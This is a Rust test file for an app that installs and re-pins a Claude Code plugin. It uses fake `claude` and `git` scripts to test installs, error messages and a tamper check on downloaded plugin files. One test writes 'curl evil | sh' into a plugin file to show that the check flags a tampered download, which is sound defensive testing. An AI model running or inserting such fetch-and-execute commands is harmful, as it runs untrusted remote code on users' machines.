use super::claude::{
    entry_is_ours, launch_check, parse_installed, pinned_ref, saved_problem, Failure, Launch, CHECK_FAILED,
    EXTRA_FILES, MARKETPLACE, MISMATCH, MISMATCH_KEPT, PLUGIN, UNCHECKED, UPDATE_FAILED,
};
use super::codex::{codex_skill, hook_command, refresh, Json, HOOK_MARK};
use super::plugin_files::{compare, lf, Difference, SHIPPED};
use super::*;
use std::fs;
use tempfile::TempDir;

// ---- a lab: a home folder, a data folder, and a pretend `claude` that logs what it's asked ----

/// A pretend `git`, for the look at a release tag before a move. It logs its arguments to `git.log`,
/// prints the tag it was asked about as if the remote has it, and prints nothing when `no-tag` exists
/// or fails when `fail-git` does (no connection). The lab has none unless it is given one (`Lab::add_git`).
const FAKE_GIT: &str = r#"#!/bin/sh
d="$(dirname "$0")"
echo "$*" >> "$d/git.log"
if [ -f "$d/fail-git" ]; then echo "fatal: unable to access 'https://github.com/': Could not resolve host" >&2; exit 128; fi
[ -f "$d/no-tag" ] || printf 'abc123\t%s\n' "$3"
exit 0
"#;

/// A pretend `claude`. It logs its arguments to `calls.log`, prints `plugins.json` for the plugin
/// list and `marketplaces.json` for the marketplace list, and fails with the text in `fail-<step>`
/// (`fail-install`, `fail-uninstall`, `fail-marketplace-add`, ...) when that file exists. A call
/// that has the first line of `fail-when` in it fails too, every time; one that has the first line of
/// `fail-once` in it fails the first time only. The calls made while the lab's note about an unfinished
/// move was there are in `with-note.log` too. Like the real one, removing a marketplace uninstalls
/// its plugin (the list is empty until the plugin is installed again, then it is what it was). Like the
/// real one, the marketplaces it lists are also in `~/.claude/plugins/known_marketplaces.json`: the lab
/// writes that file when it is given a list (see `Lab::fake`).
const FAKE_CLAUDE: &str = r#"#!/bin/sh
d="$(dirname "$0")"
echo "$*" >> "$d/calls.log"
if [ -f "$d/../data/report-cards-repin" ]; then echo "$*" >> "$d/with-note.log"; fi
key="$2"
[ "$2" = "marketplace" ] && key="$2-$3"
if [ -f "$d/fail-$key" ]; then cat "$d/fail-$key" >&2; exit 1; fi
if [ -f "$d/fail-when" ]; then
  want="$(head -n 1 "$d/fail-when")"
  case "$*" in *"$want"*) echo "Error: boom" >&2; exit 1 ;; esac
fi
if [ -f "$d/fail-once" ]; then
  want="$(head -n 1 "$d/fail-once")"
  case "$*" in *"$want"*) rm "$d/fail-once"; echo "Error: boom" >&2; exit 1 ;; esac
fi
case "$*" in
  "plugin list --json") cat "$d/plugins.json" ;;
  "plugin marketplace list --json") cat "$d/marketplaces.json" ;;
  "plugin marketplace remove"*)
    [ -f "$d/plugins.gone" ] || mv "$d/plugins.json" "$d/plugins.gone"
    echo "[]" > "$d/plugins.json" ;;
  "plugin install"*) [ -f "$d/plugins.gone" ] && mv "$d/plugins.gone" "$d/plugins.json" ;;
esac
exit 0
"#;

struct Lab {
    dir: TempDir,
    env: Env,
}

impl Lab {
    /// A home with Codex's folder in it, and no Claude Code.
    fn new() -> Lab {
        let dir = tempfile::tempdir().unwrap();
        let (home, data) = (dir.path().join("home"), dir.path().join("data"));
        fs::create_dir_all(home.join(".codex")).unwrap();
        fs::create_dir_all(&data).unwrap();
        Lab {
            env: Env { home, data, claude: None, codex: None, exe: None, windows: false, git_bash: None, git: None },
            dir,
        }
    }

    /// The same, with the pretend `claude` installed and nothing in its lists.
    fn with_claude() -> Lab {
        let mut lab = Lab::new();
        let bin = lab.bin();
        fs::create_dir_all(&bin).unwrap();
        let claude = bin.join("claude");
        fs::write(&claude, FAKE_CLAUDE).unwrap();
        #[cfg(unix)]
        fs::set_permissions(&claude, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        lab.env.claude = Some(claude);
        lab.fake("plugins.json", "[]");
        lab.fake("marketplaces.json", "[]");
        lab
    }

    fn bin(&self) -> PathBuf {
        self.dir.path().join("bin")
    }

    /// Sets what the pretend `claude` prints or fails with. A marketplace list is also written to
    /// Claude Code's own `known_marketplaces.json` (an object by name), the way Claude Code keeps both.
    fn fake(&self, file: &str, text: &str) {
        fs::write(self.bin().join(file), text).unwrap();
        if file == "marketplaces.json" {
            let list: Vec<serde_json::Value> = serde_json::from_str(text).unwrap_or_default();
            let known: serde_json::Map<String, serde_json::Value> =
                list.into_iter().filter_map(|m| Some((m.get("name")?.as_str()?.to_string(), m))).collect();
            let dir = self.known_file().parent().unwrap().to_path_buf();
            fs::create_dir_all(dir).unwrap();
            fs::write(self.known_file(), serde_json::Value::Object(known).to_string()).unwrap();
        }
    }

    /// Claude Code's own list of the marketplaces it knows.
    fn known_file(&self) -> PathBuf {
        self.env.home.join(".claude/plugins/known_marketplaces.json")
    }

    /// What `claude` was asked, one line per call, in order.
    fn calls(&self) -> Vec<String> {
        fs::read_to_string(self.bin().join("calls.log")).unwrap_or_default().lines().map(str::to_string).collect()
    }

    fn hooks(&self) -> PathBuf {
        self.env.home.join(".codex/hooks.json")
    }

    fn skill_dir(&self) -> PathBuf {
        self.env.home.join(".agents/skills/grade-me")
    }

    /// The calls `claude` got while a move was noted as unfinished (see `claude::Pending`), in order.
    fn calls_with_note(&self) -> Vec<String> {
        fs::read_to_string(self.bin().join("with-note.log")).unwrap_or_default().lines().map(str::to_string).collect()
    }

    /// The same folders, as a second `Env` (the lab keeps its own).
    fn env_copy(&self) -> Env {
        let e = &self.env;
        Env {
            home: e.home.clone(),
            data: e.data.clone(),
            claude: e.claude.clone(),
            codex: e.codex.clone(),
            exe: e.exe.clone(),
            windows: e.windows,
            git_bash: e.git_bash.clone(),
            git: e.git.clone(),
        }
    }

    /// Gives the lab the pretend `git`.
    fn add_git(&mut self) {
        let git = self.bin().join("git");
        fs::write(&git, FAKE_GIT).unwrap();
        #[cfg(unix)]
        fs::set_permissions(&git, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        self.env.git = Some(git);
    }

    /// What `git` was asked, one line per call, in order.
    fn git_calls(&self) -> Vec<String> {
        fs::read_to_string(self.bin().join("git.log")).unwrap_or_default().lines().map(str::to_string).collect()
    }

    /// The copies made of the hooks file, oldest first, as (name, text).
    fn backups(&self) -> Vec<(String, String)> {
        let mut names: Vec<String> = fs::read_dir(self.env.home.join(".codex"))
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.starts_with("hooks.json.bak-"))
            .collect();
        names.sort();
        names
            .into_iter()
            .map(|n| (fs::read_to_string(self.env.home.join(".codex").join(&n)).unwrap(), n))
            .map(|(t, n)| (n, t))
            .collect()
    }

    /// Every file and folder under the home folder, relative, folders ending in a slash.
    fn tree(&self) -> Vec<String> {
        fn walk(dir: &Path, base: &Path, out: &mut Vec<String>) {
            let mut entries: Vec<_> = fs::read_dir(dir).unwrap().flatten().collect();
            entries.sort_by_key(fs::DirEntry::file_name);
            for e in entries {
                let rel = e.path().strip_prefix(base).unwrap().to_string_lossy().into_owned();
                if e.path().is_dir() {
                    out.push(format!("{rel}/"));
                    walk(&e.path(), base, out);
                } else {
                    out.push(rel);
                }
            }
        }
        let mut out = Vec::new();
        walk(&self.env.home, &self.env.home, &mut out);
        out
    }
}

const SOURCE: &str = "HTMLGuyLLC/NoActually#v0.4.0";
const ADD: &str = "plugin marketplace add HTMLGuyLLC/NoActually#v0.4.0";
const INSTALL: &str = "plugin install grade@noactually --scope user -y";
const PLUGINS: &str = "plugin list --json";
const MARKETS: &str = "plugin marketplace list --json";
const OFFLINE: &str = "Couldn't reach GitHub to download the plugin. Check your connection and try again.";

/// Why a plugin folder differs from the shipped plugin, of either kind (see [`compare`]).
fn difference(dir: &Path) -> Option<String> {
    compare(dir).map(|found| match found {
        Difference::Changed(why) | Difference::Extra(why) => why,
    })
}

// ---- Claude Code ----

#[test]
fn turning_on_adds_the_marketplace_and_then_installs_the_plugin() {
    let lab = Lab::with_claude();
    claude_on(&lab, SOURCE).unwrap();
    assert_eq!(
        lab.calls(),
        [MARKETS, ADD, INSTALL, PLUGINS, MARKETS],
        "then it looks for the plugin's files and the marketplace's to check them"
    );
}

fn claude_on(lab: &Lab, source: &str) -> Res<()> {
    turn_on(&lab.env, Tool::ClaudeCode, source)
}

#[test]
fn turning_on_again_removes_the_marketplace_first_so_the_pin_moves() {
    let lab = Lab::with_claude();
    lab.fake("marketplaces.json", r#"[{"name":"other","source":"github","repo":"a/b"},{"name":"noactually","source":"github","repo":"HTMLGuyLLC/NoActually"}]"#);
    claude_on(&lab, "HTMLGuyLLC/NoActually#v0.5.0").unwrap();
    assert_eq!(
        lab.calls(),
        [
            MARKETS,
            "plugin marketplace remove noactually",
            "plugin marketplace add HTMLGuyLLC/NoActually#v0.5.0",
            INSTALL,
            PLUGINS,
            MARKETS
        ]
    );
}

#[test]
fn a_marketplace_list_that_cant_be_read_still_tries_the_removal() {
    let lab = Lab::with_claude();
    lab.fake("fail-marketplace-list", "unknown option --json");
    // Not there after all: "not found" is the answer we wanted.
    lab.fake("fail-marketplace-remove", "Error: Marketplace 'noactually' not found");
    claude_on(&lab, SOURCE).unwrap();
    assert_eq!(lab.calls(), [MARKETS, "plugin marketplace remove noactually", ADD, INSTALL, PLUGINS, MARKETS]);
}

#[test]
fn no_connection_says_so_in_plain_words_and_stops() {
    let lab = Lab::with_claude();
    lab.fake(
        "fail-marketplace-add",
        "fatal: unable to access 'https://github.com/HTMLGuyLLC/NoActually/': Could not resolve host: github.com",
    );
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), OFFLINE);
    assert_eq!(lab.calls(), [MARKETS, ADD], "no install after a failed add");
}

#[test]
fn any_other_failure_is_a_sentence_without_the_raw_output() {
    let lab = Lab::with_claude();
    lab.fake("fail-install", "Error: boom at /Users/someone/secret/path.js:3:14\n    at Object.<anonymous>");
    let e = claude_on(&lab, SOURCE).unwrap_err();
    assert_eq!(e, "Claude Code couldn't install the plugin. Try again in a moment.");
    assert!(!e.contains("boom") && !e.contains("/Users"));
}

#[test]
fn a_plugin_that_is_already_installed_is_fine() {
    let lab = Lab::with_claude();
    lab.fake("fail-install", "Plugin grade@noactually is already installed");
    claude_on(&lab, SOURCE).unwrap();
}

#[test]
fn without_claude_code_there_is_nothing_to_turn_on_or_off() {
    let lab = Lab::new();
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), "Claude Code isn't installed.");
    assert_eq!(turn_off(&lab.env, Tool::ClaudeCode).unwrap_err(), "Claude Code isn't installed.");
}

#[test]
fn turning_off_claude_code_turns_tips_off_and_leaves_word_for_chats_that_have_them() {
    let lab = Lab::with_claude();
    set_tips(&lab.env, true).unwrap();
    turn_off(&lab.env, Tool::ClaudeCode).unwrap();
    assert!(!lab.env.tips_file().exists());
    assert!(lab.env.tips_off_file().exists());
}

#[test]
fn turning_off_uninstalls_the_plugin_and_then_removes_the_marketplace() {
    let lab = Lab::with_claude();
    turn_off(&lab.env, Tool::ClaudeCode).unwrap();
    assert_eq!(lab.calls(), ["plugin uninstall grade@noactually -y", "plugin marketplace remove noactually"]);
}

#[test]
fn turning_off_ignores_what_is_already_gone() {
    let lab = Lab::with_claude();
    lab.fake("fail-uninstall", "Plugin grade@noactually not found");
    lab.fake("fail-marketplace-remove", "Marketplace 'noactually' not found");
    turn_off(&lab.env, Tool::ClaudeCode).unwrap();
    assert_eq!(lab.calls().len(), 2, "both steps still ran");
}

#[test]
fn turning_off_reports_a_real_failure() {
    let lab = Lab::with_claude();
    lab.fake("fail-uninstall", "EACCES: permission denied, unlink '/Users/x/.claude/plugins/foo'");
    let e = turn_off(&lab.env, Tool::ClaudeCode).unwrap_err();
    assert_eq!(e, "Claude Code couldn't remove the plugin. Try again in a moment.");
    assert_eq!(lab.calls().len(), 1, "stops at the first failure");
}

#[test]
fn the_plugin_list_decides_whether_it_is_on() {
    let lab = Lab::with_claude();
    let on = |lab: &Lab| status(&lab.env, &[], None).claude_code.on;
    assert!(!on(&lab), "nothing installed");
    lab.fake("plugins.json", r#"[{"id":"other@x","version":"1","enabled":true}]"#);
    assert!(!on(&lab), "someone else's plugin");
    lab.fake("plugins.json", r#"[{"id":"other@x"},{"id":"grade@noactually","version":"0.4.0","scope":"user","enabled":true,"installPath":"/x"}]"#);
    assert!(on(&lab));
    lab.fake("plugins.json", r#"[{"id":"grade@noactually","enabled":false}]"#);
    assert!(!on(&lab), "installed but switched off inside Claude Code");
    lab.fake("plugins.json", r#"[{"name":"grade","marketplace":"noactually"}]"#);
    assert!(on(&lab), "the older shape, with the id split in two");
    lab.fake("plugins.json", r#"{"plugins":[{"id":"grade@noactually"}]}"#);
    assert!(on(&lab), "wrapped in an object");
    lab.fake("plugins.json", "Warning: something\n[{\"id\":\"grade@noactually\"}]\n");
    assert!(on(&lab), "a warning before the JSON");
    for junk in ["", "not json", "null", "42", r#"[1,"a",null]"#, r#"{"x":1}"#] {
        lab.fake("plugins.json", junk);
        assert!(!on(&lab), "{junk:?} reads as nothing installed");
    }
    lab.fake("fail-list", "boom");
    assert!(!on(&lab), "a failing list, with nothing on record, is not on");
}

#[test]
fn a_list_that_fails_keeps_the_row_as_claude_code_last_recorded_it_and_says_so() {
    let lab = Lab::with_claude();
    lab.fake("fail-list", "boom");
    let shown = |lab: &Lab| {
        let row = status(&lab.env, &[], None).claude_code;
        (row.on, row.problem)
    };
    let said = Some(CHECK_FAILED.to_string());
    assert_eq!(CHECK_FAILED, "Couldn't check Claude Code. Try Look again.");
    assert_eq!(shown(&lab), (false, said.clone()), "nothing on record: off, but it says it couldn't look");
    // The marketplace is known: the person turned report cards on, so Turn on would only install it again.
    lab.fake("marketplaces.json", &ours_at("v0.4.0"));
    assert_eq!(shown(&lab), (true, said.clone()));
    // Claude Code's list of installed plugins is the better evidence when it can be read.
    let plugins = lab.env.home.join(".claude/plugins/installed_plugins.json");
    fs::write(&plugins, r#"{"version":2,"plugins":{"other@x":[{"scope":"user"}]}}"#).unwrap();
    assert_eq!(shown(&lab), (false, said.clone()), "the plugin isn't in it, whatever the marketplace says");
    fs::write(&plugins, r#"{"version":2,"plugins":{"grade@noactually":[{"scope":"user","version":"0.4.0"}]}}"#)
        .unwrap();
    assert_eq!(shown(&lab), (true, said));
    // A list that works settles it, and the problem goes.
    fs::remove_file(lab.bin().join("fail-list")).unwrap();
    assert_eq!(shown(&lab), (false, None));
    lab.fake("plugins.json", r#"[{"id":"grade@noactually"}]"#);
    assert_eq!(shown(&lab), (true, None));
}

#[test]
fn the_plugin_list_parser_skips_what_it_cant_read() {
    let found = parse_installed(r#"[{"id":"a@b","version":"1.2.3","enabled":false},{"nope":true},"x",{"name":"c"}]"#);
    assert_eq!(found.len(), 1);
    assert_eq!((found[0].id.as_str(), found[0].enabled), ("a@b", false));
}

#[test]
fn a_claude_that_hangs_is_stopped() {
    let dir = tempfile::tempdir().unwrap();
    let script = dir.path().join("slow");
    fs::write(&script, "#!/bin/sh\nexec sleep 30\n").unwrap();
    #[cfg(unix)]
    fs::set_permissions(&script, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    let started = Instant::now();
    let ran = run(&script, &[], Duration::from_millis(200)).unwrap();
    assert!(ran.timed_out && !ran.ok);
    assert!(started.elapsed() < Duration::from_secs(5));
}

#[test]
fn a_timeout_has_its_own_message() {
    let ran = Ran { ok: false, timed_out: true, out: String::new(), err: String::new() };
    assert_eq!(claude_explain(&ran), "Claude Code took too long to answer. Try again in a moment.");
}

fn claude_explain(ran: &Ran) -> String {
    super::claude::explain(ran, "add the plugin")
}

#[test]
fn network_trouble_in_any_of_its_spellings_reads_as_offline() {
    for said in [
        "getaddrinfo ENOTFOUND github.com",
        "fetch failed",
        "Network is unreachable",
        "Failed to connect to github.com port 443",
        "ETIMEDOUT",
    ] {
        let ran = Ran { ok: false, timed_out: false, out: String::new(), err: said.into() };
        assert_eq!(claude_explain(&ran), OFFLINE, "{said}");
    }
}

const TOO_OLD: &str = "Update Claude Code, then try again.";
const BLOCKED: &str = "Your organization's Claude Code settings don't allow adding plugins.";

fn failed_with(said: &str) -> Ran {
    Ran { ok: false, timed_out: false, out: String::new(), err: said.into() }
}

#[test]
fn a_claude_code_without_plugins_says_to_update_it() {
    for said in [
        "error: unknown command 'plugin'",
        "error: unknown command 'marketplace'\n(Did you mean marketplace?)",
        "Unknown command: plugin",
        "claude: unrecognized command 'plugin'",
        "Error: Invalid command \"plugin\"",
        "error: no such command: plugin",
        "plugin is not a known command",
        "error: unknown option '-y'",
        "error: unrecognized option '--scope'",
        "Unknown subcommand: marketplace",
    ] {
        assert_eq!(claude_explain(&failed_with(said)), TOO_OLD, "{said}");
    }
    let lab = Lab::with_claude();
    lab.fake("fail-marketplace-add", "error: unknown command 'plugin'");
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), TOO_OLD);
    assert_eq!(lab.calls(), [MARKETS, ADD], "and nothing is tried after it");
}

#[test]
fn a_claude_code_without_plugins_is_told_so_wherever_the_first_call_fails() {
    // The list can't be read, so the removal is tried first, and that is where it fails.
    let lab = Lab::with_claude();
    lab.fake("fail-marketplace-list", "error: unknown command 'plugin'");
    lab.fake("fail-marketplace-remove", "error: unknown command 'plugin'");
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), TOO_OLD);
    let lab = Lab::with_claude();
    lab.fake("fail-install", "error: unknown command 'plugin'");
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), TOO_OLD);
}

#[test]
fn settings_that_block_plugins_say_so() {
    for said in [
        "Error: Marketplace 'noactually' is blocked by enterprise policy",
        "Failed to add marketplace: blocked by managed settings",
        "This marketplace source is not allowed by your organization's settings",
        "Source github:HTMLGuyLLC/NoActually is not in the allowed marketplaces list",
        "Error: marketplace not permitted by strictKnownMarketplaces",
        "Plugin installation is disabled by policy. Contact your administrator.",
        "Error: plugin grade@noactually is forbidden by managed-settings.json",
        "Marketplace blocked: Your admin has restricted which marketplaces can be added",
        "error: The source is on the blockedMarketplaces list",
        "Marketplace is not in the list of allowed sources",
    ] {
        assert_eq!(claude_explain(&failed_with(said)), BLOCKED, "{said}");
    }
    let lab = Lab::with_claude();
    lab.fake("fail-marketplace-add", "Error: Marketplace is blocked by policy (managed settings)");
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), BLOCKED);
    assert_eq!(lab.calls(), [MARKETS, ADD]);
    let lab = Lab::with_claude();
    lab.fake("fail-install", "Plugin grade@noactually is not allowed by your organization's policy");
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), BLOCKED);
}

#[test]
fn other_trouble_keeps_its_own_sentences() {
    for (said, sentence) in [
        (
            "Error: boom at /Users/someone/secret/path.js:3:14",
            "Claude Code couldn't add the plugin. Try again in a moment.",
        ),
        (
            "EACCES: permission denied, unlink '/Users/x/.claude/plugins/foo'",
            "Claude Code couldn't add the plugin. Try again in a moment.",
        ),
        ("fatal: unable to access 'https://github.com/a/b/': Could not resolve host: github.com", OFFLINE),
        ("getaddrinfo ENOTFOUND github.com", OFFLINE),
        ("Marketplace 'noactually' not found", "Claude Code couldn't add the plugin. Try again in a moment."),
        ("Marketplace already exists", "Claude Code couldn't add the plugin. Try again in a moment."),
    ] {
        assert_eq!(claude_explain(&failed_with(said)), sentence, "{said}");
    }
    let timed_out = Ran { timed_out: true, ..failed_with("error: unknown command 'plugin'") };
    assert_eq!(claude_explain(&timed_out), "Claude Code took too long to answer. Try again in a moment.");
}

#[test]
fn json_is_found_after_a_warning() {
    assert_eq!(json_in("warning: x\n[1,2]\nbye").unwrap(), serde_json::json!([1, 2]));
    assert_eq!(json_in("{\"a\":1}").unwrap(), serde_json::json!({"a": 1}));
    assert!(json_in("nothing here").is_none());
}

// ---- where the plugin comes from ----

#[test]
fn a_release_pins_the_apps_own_tag_and_ignores_the_override() {
    assert_eq!(source_for(false, "0.4.0", None), "HTMLGuyLLC/NoActually#v0.4.0");
    assert_eq!(source_for(false, "0.4.0", Some("/my/fork".into())), "HTMLGuyLLC/NoActually#v0.4.0");
}

#[test]
fn a_debug_build_uses_this_repo_unless_told_otherwise() {
    let root = source_for(true, "0.4.0", None);
    assert!(Path::new(&root).join(".claude-plugin/marketplace.json").is_file(), "{root}");
    assert!(Path::new(&root).join("plugins/grade/.claude-plugin/plugin.json").is_file());
    assert_eq!(source_for(true, "0.4.0", Some("/my/fork".into())), "/my/fork");
    assert_eq!(source_for(true, "0.4.0", Some(String::new())), root, "an empty override is no override");
}

#[test]
fn the_marketplace_file_names_what_the_app_installs() {
    let root = source_for(true, "0.4.0", None);
    let market: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(Path::new(&root).join(".claude-plugin/marketplace.json")).unwrap())
            .unwrap();
    assert_eq!(market["name"], MARKETPLACE);
    assert_eq!(format!("{}@{MARKETPLACE}", market["plugins"][0]["name"].as_str().unwrap()), PLUGIN);
}

// ---- moving the pin after an app update ----

fn installed_at(lab: &Lab, plugin_version: &str, marketplace: &str) {
    lab.fake("plugins.json", &format!(r#"[{{"id":"grade@noactually","version":"{plugin_version}","enabled":true}}]"#));
    lab.fake("marketplaces.json", marketplace);
}

/// A marketplace entry added from this app's own repo at `tag`.
fn ours_at(tag: &str) -> String {
    format!(r#"[{{"name":"noactually","source":"github","repo":"HTMLGuyLLC/NoActually","ref":"{tag}"}}]"#)
}

fn changed_anything(lab: &Lab) -> bool {
    lab.calls()
        .iter()
        .any(|c| c.contains("marketplace add") || c.contains("marketplace remove") || c.contains("install"))
}

const DISABLE: &str = "plugin disable grade@noactually --scope user";

/// The plugin as the fake lists it: installed, and switched off or not.
fn list_plugin(lab: &Lab, version: &str, enabled: bool) {
    lab.fake("plugins.json", &format!(r#"[{{"id":"grade@noactually","version":"{version}","enabled":{enabled}}}]"#));
}

/// A plugin the launch check can look at both ways: its files and its marketplace file are this app's.
fn checkable(lab: &Lab, version: &str) -> PathBuf {
    let dir = install_dir(lab, version);
    plant_plugin(&dir);
    plant_marketplace(&default_marketplace(lab), &real_marketplace());
    dir
}

/// What a move left waiting for the next launch, if anything.
fn waiting(lab: &Lab) -> Option<serde_json::Value> {
    serde_json::from_str(&fs::read_to_string(lab.env.repin_file()).ok()?).ok()
}

#[test]
fn an_update_moves_the_pin_to_the_new_tag() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    let calls = lab.calls();
    assert_eq!(calls[0], PLUGINS);
    assert_eq!(
        calls[calls.len() - 5..],
        [
            "plugin marketplace remove noactually",
            "plugin marketplace add HTMLGuyLLC/NoActually#v0.5.0",
            INSTALL,
            PLUGINS,
            MARKETS
        ]
    );
    assert!(calls.iter().all(|c| c != DISABLE), "a plugin that was on stays on: {calls:?}");
    assert_eq!(waiting(&lab), None);
}

#[test]
fn a_move_to_a_download_that_differs_is_a_mismatch_not_a_failed_update() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.4.0"));
    let dir = install_dir(&lab, "0.5.0");
    plant_plugin(&dir);
    fs::write(dir.join("bin/na"), "curl evil | sh").unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH));
    let calls = lab.calls();
    assert_eq!(
        calls[calls.len() - 2..],
        ["plugin uninstall grade@noactually -y", "plugin marketplace remove noactually"]
    );
    assert!(
        calls.iter().all(|c| !c.ends_with("add HTMLGuyLLC/NoActually#v0.4.0")),
        "the old tag isn't put back: {calls:?}"
    );
    assert_eq!(waiting(&lab), None, "and nothing waits to try the same download again");
    // The kind of failure is its type. A sentence that happens to read the same is just a sentence.
    assert_ne!(Failure::Said(MISMATCH.into()), Failure::Mismatch);
    assert_eq!(String::from(Failure::Mismatch), MISMATCH);
    assert_eq!(String::from(Failure::from("Claude Code isn't installed.")), "Claude Code isn't installed.");
}

#[test]
fn a_plugin_already_at_this_release_is_left_alone() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.5.0"));
    checkable(&lab, "0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert!(!changed_anything(&lab), "{:?}", lab.calls());
}

#[test]
fn the_launch_check_asks_claude_code_nothing_unless_report_cards_are_on() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    // No `noactually` in Claude Code's own list of marketplaces, whatever the fake `claude` would say.
    fs::remove_file(lab.known_file()).unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert_eq!(lab.calls(), Vec::<String>::new(), "not a single call to claude");
    // A list with other marketplaces in it and not ours is the same.
    fs::write(lab.known_file(), r#"{"other":{"source":{"source":"github","repo":"a/b"}}}"#).unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    // So is a list that is not JSON, or an object with no marketplaces in it.
    for junk in ["", "not json", "[]", "{}", "null"] {
        fs::write(lab.known_file(), junk).unwrap();
        assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine, "{junk:?}");
    }
    assert_eq!(lab.calls(), Vec::<String>::new());
    // The retry while the app stays open reads one file and nothing else either.
    assert!(super::claude::retry_pending(&lab.env, "0.5.0").is_none());
    assert_eq!(lab.calls(), Vec::<String>::new());
    // With report cards on, the marketplace is in the list, and the check goes on as before.
    lab.fake("marketplaces.json", &ours_at("v0.4.0"));
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    assert_eq!(lab.calls()[0], PLUGINS);
}

#[test]
fn a_marketplace_that_is_not_ours_still_gets_looked_at_and_left_alone() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", r#"[{"name":"noactually","source":"github","repo":"HTMLGuyLLC/NoActually"}]"#);
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert_eq!(lab.calls()[0], PLUGINS, "the file lists a `noactually`, so claude is asked");
    assert!(!changed_anything(&lab));
}

#[test]
fn a_move_waiting_is_finished_even_when_claude_code_lists_no_marketplace() {
    // Removing the marketplace uninstalls the plugin, so a move that stopped half way leaves no
    // marketplace in the file; the note is what says the plugin is wanted.
    let lab = Lab::with_claude();
    fs::remove_file(lab.known_file()).unwrap();
    fs::write(lab.env.repin_file(), r#"{"pin":"v0.4.0"}"#).unwrap();
    launch_check(&lab.env, "0.5.0");
    assert_eq!(lab.calls()[0], PLUGINS, "{:?}", lab.calls());
}

#[test]
fn only_a_marketplace_pinned_to_our_repo_is_ever_moved() {
    let lab = Lab::with_claude();
    for (what, market) in [
        ("the README's, not pinned", r#"[{"name":"noactually","source":"github","repo":"HTMLGuyLLC/NoActually"}]"#),
        ("a branch, not a release", &ours_at("main")),
        ("a bare v", &ours_at("v")),
        ("a fork", r#"[{"name":"noactually","source":"github","repo":"someone/NoActually","ref":"v0.4.0"}]"#),
        ("a local folder", r#"[{"name":"noactually","source":"directory","path":"/Users/me/NoActually"}]"#),
        (
            "a local folder with a tag-like name",
            r#"[{"name":"noactually","source":"directory","path":"/x/y","ref":"v1"}]"#,
        ),
        (
            "someone else's under another name",
            r#"[{"name":"other","source":"github","repo":"HTMLGuyLLC/NoActually","ref":"v0.4.0"}]"#,
        ),
    ] {
        installed_at(&lab, "0.4.0", market);
        assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine, "{what}");
        assert!(!changed_anything(&lab), "{what}: {:?}", lab.calls());
    }
}

#[test]
fn the_pin_is_found_wherever_claude_code_puts_it() {
    let lab = Lab::with_claude();
    let pin = |lab: &Lab| pinned_ref(&lab.env, lab.env.claude.as_deref().unwrap());
    lab.fake(
        "marketplaces.json",
        r#"[{"name":"noactually","source":{"source":"github","repo":"HTMLGuyLLC/NoActually","ref":"v1"}}]"#,
    );
    assert_eq!(pin(&lab).as_deref(), Some("v1"), "on the source");
    lab.fake("marketplaces.json", r#"[{"name":"noactually","source":"github","repo":"HTMLGuyLLC/NoActually#v2"}]"#);
    assert_eq!(pin(&lab).as_deref(), Some("v2"), "after a # in the repo");
    lab.fake("marketplaces.json", r#"[{"name":"noactually","source":"HTMLGuyLLC/NoActually#v2"}]"#);
    assert_eq!(pin(&lab).as_deref(), Some("v2"), "after a # in the source");
    lab.fake("marketplaces.json", r#"[{"name":"noactually","source":"github","repo":"HTMLGuyLLC/NoActually"}]"#);
    assert_eq!(pin(&lab), None, "not pinned");
    lab.fake("marketplaces.json", r#"[{"name":"noactually","source":"github","repo":"x/y#v2"}]"#);
    assert_eq!(pin(&lab), None, "another repo");
    // Its settings file, when the list doesn't say.
    let known = lab.env.home.join(".claude/plugins");
    fs::create_dir_all(&known).unwrap();
    fs::write(
        known.join("known_marketplaces.json"),
        r#"{"noactually":{"source":{"source":"github","repo":"HTMLGuyLLC/NoActually","ref":"v3"}}}"#,
    )
    .unwrap();
    assert_eq!(pin(&lab).as_deref(), Some("v3"));
    fs::write(
        known.join("known_marketplaces.json"),
        r#"{"noactually":{"source":{"source":"directory","path":"/x","ref":"v3"}}}"#,
    )
    .unwrap();
    assert_eq!(pin(&lab), None, "a local folder there isn't ours either");
}

#[test]
fn with_no_readable_pin_the_plugin_is_left_alone() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", "[]");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert!(!changed_anything(&lab));
}

#[test]
fn an_update_does_nothing_when_the_plugin_is_not_there() {
    let lab = Lab::with_claude();
    lab.fake("marketplaces.json", &ours_at("v0.4.0"));
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert_eq!(lab.calls(), [PLUGINS]);
    assert_eq!(launch_check(&Lab::new().env, "0.5.0"), Launch::Fine, "no Claude Code at all");
    lab.fake("fail-list", "boom");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine, "a list that fails is left for next time");
}

#[test]
